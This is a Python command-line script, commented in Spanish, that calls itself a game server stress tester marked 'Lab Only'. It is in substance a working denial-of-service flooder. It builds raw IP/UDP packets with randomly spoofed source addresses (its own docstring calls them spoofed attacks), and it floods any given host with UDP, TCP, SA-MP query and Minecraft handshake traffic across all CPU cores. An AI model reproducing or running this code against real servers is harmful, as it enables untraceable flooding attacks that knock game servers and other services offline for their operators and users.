#!/usr/bin/env python3
"""
Universal Game Server Stress Tester v3 (High Performance)
Optimizado con sockets no bloqueantes nativos y pools precalculados de memoria.
"""

import argparse
import asyncio
import multiprocessing
import threading
import socket
import struct
import random
import time
import os
import psutil

# —— Helpers y Constructores de Paquetes ——

def random_ip() -> str:
    """Genera una dirección IP aleatoria válida para emulación."""
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def build_udp_packet(src: str, dst: str, dport: int, size: int) -> bytes:
    """Construye un paquete crudo (Raw) IP/UDP para ataques spoofed."""
    # Cabecera IP (Versión, IHL, Tipo de Servicio, Longitud Total, ID, Flags, TTL, Protocolo, Checksum, IPs)
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
        (4 << 4) | 5, 0, 20 + 8 + size, random.randint(0, 65535),
        0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst)
    )
    # Cabecera UDP (Puerto Origen, Puerto Destino, Longitud, Checksum)
    udp_hdr = struct.pack('!HHHH',
        random.randint(1024, 65535), dport, 8 + size, 0
    )
    return ip_hdr + udp_hdr + os.urandom(size)

def encode_varint(v: int) -> bytes:
    """Codifica un entero a formato VarInt de Minecraft."""
    b = b''
    while True:
        temp = v & 0x7F
        v >>= 7
        if v:
            temp |= 0x80
        b += struct.pack('B', temp)
        if not v:
            break
    return b

def make_mc(host: str, port: int) -> bytes:
    """Construye el payload del Handshake de Minecraft."""
    hs = (
        encode_varint(754)  # Protocolo (1.16.5+)
        + encode_varint(len(host)) + host.encode()
        + struct.pack('>H', port)
        + encode_varint(1)  # Próximo estado: 1 (status)
    )
    return encode_varint(len(hs) + 1) + b'\x00' + hs + b'\x01\x00'

def make_samp(host: str, port: int) -> bytes:
    """Construye el paquete básico de consulta para SA-MP."""
    return b'SAMP' + socket.inet_aton(host) + struct.pack('>H', port) + b'i'

# —— Workers Optimizados de Alto Rendimiento ——

async def udp_worker(host: str, port: int, pkt_pool: list, delay_pool: list, stop_time: float, stats: dict):
    """Worker UDP usando sockets nativos de bajo nivel."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)  # Modo no bloqueante para no congelar el loop de asyncio
    
    loop = asyncio.get_running_loop()
    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)
    i = 0
    
    try:
        while time.time() < stop_time:
            pkt = pkt_pool[i % pkt_count]
            try:
                # Intenta enviar directamente vía abstracción del loop (optimiza bajo nivel)
                sock.sendto(pkt, (host, port))
                stats['sent'] += 1
            except (BlockingIOError, InterruptedError):
                # El búfer del sistema operativo está lleno, esperamos un microsegundo
                await asyncio.sleep(0.001)
                continue
            
            # Optimización: Solo suspender si el delay precalculado es significativo
            delay = delay_pool[i % delay_count]
            if delay > 0:
                await asyncio.sleep(delay)
            elif i % 100 == 0:
                # Forzar un cambio de contexto mínimo cada 100 paquetes para no bloquear el loop
                await asyncio.sleep(0)
            i += 1
    finally:
        sock.close()

async def tcp_worker(host: str, port: int, pkt_pool: list, delay_pool: list, stop_time: float, stats: dict):
    """Worker TCP que gestiona la conexión a nivel de socket bruto para evitar sobrecarga."""
    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)
    i = 0
    
    while time.time() < stop_time:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        loop = asyncio.get_running_loop()
        
        try:
            # Intento de conexión no bloqueante controlado por timeout
            await asyncio.wait_for(loop.sock_connect(sock, (host, port)), timeout=1.0)
            await loop.sock_sendall(sock, pkt_pool[i % pkt_count])
            stats['sent'] += 1
        except Exception:
            pass  # Falló la conexión o el envío bajo estrés, se ignora el error de red
        finally:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except Exception:
                pass
                
        delay = delay_pool[i % delay_count]
        if delay > 0:
            await asyncio.sleep(delay)
        else:
            await asyncio.sleep(0)
        i += 1

async def udp_spoof_worker(host: str, port: int, pkt_pool: list, delay_pool: list, stop_time: float, stats: dict):
    """Worker Raw Socket UDP para IP Spoofing de alto rendimiento."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setblocking(False)
    except PermissionError:
        print("[!] Permisos de Root/Administrador requeridos para Raw Sockets.")
        return

    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)
    i = 0
    
    try:
        while time.time() < stop_time:
            try:
                sock.sendto(pkt_pool[i % pkt_count], (host, port))
                stats['sent'] += 1
            except (BlockingIOError, InterruptedError):
                await asyncio.sleep(0.001)
                continue
                
            delay = delay_pool[i % delay_count]
            if delay > 0:
                await asyncio.sleep(delay)
            elif i % 100 == 0:
                await asyncio.sleep(0)
            i += 1
    finally:
        sock.close()

async def samp_worker(host: str, port: int, _pkt_pool: list, delay_pool: list, stop_time: float, stats: dict):
    """Worker optimizado específicamente para inundación de consultas SA-MP."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    pkt = make_samp(host, port)
    delay_count = len(delay_pool)
    i = 0
    
    try:
        while time.time() < stop_time:
            try:
                sock.sendto(pkt, (host, port))
                stats['sent'] += 1
            except (BlockingIOError, InterruptedError):
                await asyncio.sleep(0.001)
                continue
                
            delay = delay_pool[i % delay_count]
            if delay > 0:
                await asyncio.sleep(delay)
            elif i % 100 == 0:
                await asyncio.sleep(0)
            i += 1
    finally:
        sock.close()

async def mc_worker(host: str, port: int, _pkt_pool: list, delay_pool: list, stop_time: float, stats: dict):
    """Worker de conexiones rápidas simulando Handshakes legítimos de Minecraft."""
    pkt = make_mc(host, port)
    delay_count = len(delay_pool)
    i = 0
    
    while time.time() < stop_time:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        loop = asyncio.get_running_loop()
        
        try:
            await asyncio.wait_for(loop.sock_connect(sock, (host, port)), timeout=1.0)
            await loop.sock_sendall(sock, pkt)
            stats['sent'] += 1
        except Exception:
            pass
        finally:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except Exception:
                pass
                
        delay = delay_pool[i % delay_count]
        if delay > 0:
            await asyncio.sleep(delay)
        else:
            await asyncio.sleep(0)
        i += 1

# —— Monitor de Métricas ——

def stats_printer(mode: str, stats: dict, interval: float = 1.0):
    """Imprime de forma ordenada el rendimiento del proceso local."""
    prev = 0
    cpu_timer = 0
    while not stats.get('done', False):
        time.sleep(interval)
        current_sent = stats['sent']
        pps = current_sent - prev
        prev = current_sent
        
        cpu_timer += interval
        cpu = psutil.cpu_percent(interval=None) if cpu_timer >= 5 else "..."
        if cpu_timer >= 5:
            cpu_timer = 0
            
        print(f"[{mode.upper()}] {pps:<7} pkt/s | Total Enviado: {current_sent:<10} | CPU: {cpu}%")

# —— Orquestador de Procesos ——

def run_process(args, mode: str, worker_func):
    """Inicializa el entorno y el loop de eventos asincrónicos para cada core."""
    stats = {'sent': 0, 'done': False}
    stop_time = time.time() + args.duration

    # Generación limpia y eficiente de pools fijos en memoria
    pkt_pool = [os.urandom(random.randint(args.min_pkt, args.max_pkt)) for _ in range(100)]
    
    if mode == 'udp-spoof':
        pkt_pool = [
            build_udp_packet(random_ip(), args.host, args.port, random.randint(args.min_pkt, args.max_pkt))
            for _ in range(100)
        ]
        
    delay_pool = [max(0.0, args.delay + random.uniform(-args.jitter, args.jitter)) for _ in range(100)]

    # Hilo secundario de telemetría por proceso
    t_stats = threading.Thread(target=stats_printer, args=(mode, stats), daemon=True)
    t_stats.start()

    async def main_loop():
        # Ejecuta múltiples tareas concurrentes dentro de este mismo proceso
        tasks = [
            worker_func(args.host, args.port, pkt_pool, delay_pool, stop_time, stats)
            for _ in range(args.concurrency)
        ]
        await asyncio.gather(*tasks)
        stats['done'] = True

    asyncio.run(main_loop())
    t_stats.join()

# —— Interfaz de Línea de Comandos (CLI) ——

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal Stress Tester v3 (High Performance - Lab Only)")
    parser.add_argument("mode", choices=['udp', 'tcp', 'udp-spoof', 'samp', 'mc', 'combo'])
    parser.add_argument("host", help="IP o dominio del objetivo de la prueba")
    parser.add_argument("-p", "--port", type=int, default=25565, help="Puerto destino")
    parser.add_argument("--min-pkt", type=int, default=512, help="Tamaño mínimo del paquete de datos")
    parser.add_argument("--max-pkt", type=int, default=2048, help="Tamaño máximo del paquete de datos")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duración del test en segundos")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay base entre paquetes (0.0 para máximo rendimiento)")
    parser.add_argument("--jitter", type=float, default=0.0, help="Variación aleatoria del delay")
    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Tareas concurrentes asincrónicas por proceso")
    parser.add_argument("-P", "--processes", type=int, default=multiprocessing.cpu_count(), help="Número de procesos paralelos")
    args = parser.parse_args()

    funcs = {
        'udp': udp_worker,
        'tcp': tcp_worker,
        'udp-spoof': udp_spoof_worker,
        'samp': samp_worker,
        'mc': mc_worker
    }

    modes = [args.mode] if args.mode != 'combo' else ['udp', 'tcp', 'samp', 'mc']
    procs = []
    
    print(f"[*] Inicializando entorno de pruebas...")
    print(f"[*] Cores detectados / Procesos asignados: {args.processes}")
    print(f"[*] Concurrencia interna por proceso: {args.concurrency}")

    try:
        for mode in modes:
            func = funcs.get(mode)
            if not func:
                continue
            for _ in range(args.processes):
                p = multiprocessing.Process(target=run_process, args=(args, mode, func))
                p.start()
                procs.append(p)
                
        for p in procs:
            p.join()
            
    except KeyboardInterrupt:
        print("\n[!] Prueba cancelada por el usuario de forma abrupta.")
    finally:
        print("[+] Test de estrés finalizado con éxito.")
